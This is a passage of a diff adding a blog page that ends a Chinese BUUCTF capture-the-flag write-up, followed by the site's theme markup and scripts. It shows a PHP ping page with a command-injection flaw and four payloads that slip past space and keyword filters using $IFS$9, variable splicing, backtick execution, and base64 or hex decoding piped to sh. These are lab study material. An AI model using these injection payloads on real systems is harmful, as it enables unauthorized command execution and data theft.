class="hljs-string">&quot;ping -c 4 &quot;</span>.<span class="hljs-variable">$ip</span>);<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>;<br>  <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$a</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>简单ls后发现flag.php，但是尝试cat的时候发现空格被过滤，可以用<code>$IFS$9</code>绕过空格。</p>
+<p>然后flag也被过滤。可以使用变量拼接法、内联执行或者编码法。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">//1.变量替换<br>//a=ag;<span class="hljs-built_in">cat</span> fl<span class="hljs-variable">$a</span>.php<br>?ip=1;a=ag;<span class="hljs-built_in">cat</span>$IFS$9fl<span class="hljs-variable">$a</span>.php<br><br>//2.内联执行，这种方法之前没用过 将<span class="hljs-built_in">ls</span>的所有文件全部<span class="hljs-built_in">cat</span>出来！<br>//cat `<span class="hljs-built_in">ls</span>`<br>?ip=1;<span class="hljs-built_in">cat</span>$IFS<span class="hljs-variable">$9</span>`<span class="hljs-built_in">ls</span>`<br><br>//3.<span class="hljs-built_in">base64</span>解码后执行<br>//echo Y2F0IGZsYWcucGhwCg== | <span class="hljs-built_in">base64</span> -d | sh<br>?ip=1;<span class="hljs-built_in">echo</span>$IFS<span class="hljs-variable">$9Y2F0IGZsYWcucGhwCg</span>==|<span class="hljs-built_in">base64</span>$IFS<span class="hljs-variable">$9</span>-d|sh<br><br>//4.hex解码后执行 这种编码之前没用过<br>//echo 63617420666c61672e706870 | xxd -r -p | sh<br>?ip=1;<span class="hljs-built_in">echo</span>$IFS$963617420666c61672e706870$IFS<span class="hljs-variable">$9</span>|xxd$IFS<span class="hljs-variable">$9</span>-r$IFS<span class="hljs-variable">$9</span>-p|sh <br></code></pre></td></tr></table></figure>
+<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/ctf/">#ctf</a>
+      
+        <a href="/tags/writeup/">#writeup</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>BUUCTF刷题记录</div>
+      <div>https://wuuconix.link/2022/01/21/buuctf/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>wuuconix</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年1月21日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/01/23/github-host/" title="GitHub图床配合 jsDelivr实现大图存储">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">GitHub图床配合 jsDelivr实现大图存储</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/01/13/vue/" title="Vue3 解密 （持续更新中）">
+                        <span class="hidden-mobile">Vue3 解密 （持续更新中）</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.4.16/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"tHbt1wElFiuw8zrDBIEUsNIv-gzGzoHsz","appKey":"ztzeLh1CDeUvYk1YrI8bK8kW","path":"window.location.pathname","placeholder":"留下一条友善的评论吧","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  <script>
+  Fluid.utils.createScript('https://lib.baomitu.com/mermaid/8.13.10/mermaid.min.js', function() {
+    mermaid.initialize({"theme":"default"});
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('mermaid' in window) {
+        mermaid.init();
+      }
+    });
+  });
+</script>
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a><br> <span>本网站由 <a href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral" target="_blank""><img src="https://upyun.wuuconix.link/upyun.png" srcset="/img/loading.gif" lazyload width="53" height="18" style="fill: currentColor;"/></a> 提供 CDN 加速/云存储服务</span> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      浙ICP备2021025197号-1
+    </a>
+  </span>
+  
+    
+      <span>
+        <a
+          href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=33048202000536"
+          rel="nofollow noopener"
+          class="beian-police"
+          target="_blank"
+        >
+          
+            <span style="visibility: hidden; width: 0">|</span>
+            <img src="/img/police_beian.png" srcset="/img/loading.gif" lazyload alt="police-icon"/>
+          
+          <span>浙公网安备33048202000536号</span>
+        </a>
+      </span>
+    
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.0/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/caidai.js"></script>
+<script src="//paste.vaala.cloud/raw/siqopubiwi.js"></script>
+<script src="/js/APlayer.min.js"></script>
+<script src="//url.wuuconix.link/live2d.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
